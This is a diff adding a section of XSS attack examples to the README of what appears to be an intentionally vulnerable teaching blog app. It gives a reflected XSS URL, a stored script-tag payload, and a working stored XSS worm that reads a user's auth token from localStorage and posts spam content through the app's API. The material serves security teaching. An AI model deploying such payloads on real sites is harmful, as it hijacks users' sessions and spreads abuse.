@@ -135,3 +135,32 @@ To prevent XSS attacks, the following measures can be implemented:
 | All Blogs (/blogs)           | Displays all blogs + Search + Create a new post |
 | View Post (/blogs/{id})      | Displays a single blog and its comments         |
 
+
+## XSS Attacks examples
+
+- Reflected XSS attack via search query parameter:
+  - Search for a blog post with a script tag in the title.
+  - Example: `http://localhost:8080/blogs?query=<script>alert('XSS')</script>`
+
+- Stored XSS attack via blog post creation or commenting on a famous blog post:
+    - Create a blog post with a script tag in the content.
+    - Example: `<script>alert('XSS')</script>`
+
+    - Injecting a XSS Worm into the applicaion:
+        - Create a blog post with a script tag that creates a new blog post with a script tag in the content.
+        - Example:
+        ```html
+            <script>
+                const token = localStorage.getItem('authToken')
+                const formData = new FormData();
+                formData.append('title', 'Make Money in Minutes');
+                formData.append('content', "Lorem ipsum dolor sit amet, consectetur adipisicing elit. Reiciendis suscipit possimus dolore. Quibusdam mollitia id accusamus consequatur ea molestiae eum vitae suscipit, voluptatibus rem eveniet, tempora necessitatibus aliquam voluptate alias? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Reiciendis suscipit possimus dolore. Quibusdam mollitia id accusamus consequatur ea molestiae eum vitae suscipit, voluptatibus rem eveniet, tempora necessitatibus aliquam voluptate alias? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Reiciendis suscipit possimus dolore. Quibusdam mollitia id accusamus consequatur ea molestiae eum vitae suscipit, voluptatibus rem eveniet, tempora necessitatibus aliquam voluptate alias?");
+                fetch('/api/blogs', {
+                	method: 'POST',
+                	body: formData,
+                	headers: {
+                		'Authorization': `Bearer ${token}`,
+                        }
+                });
+            </script>
+        ```
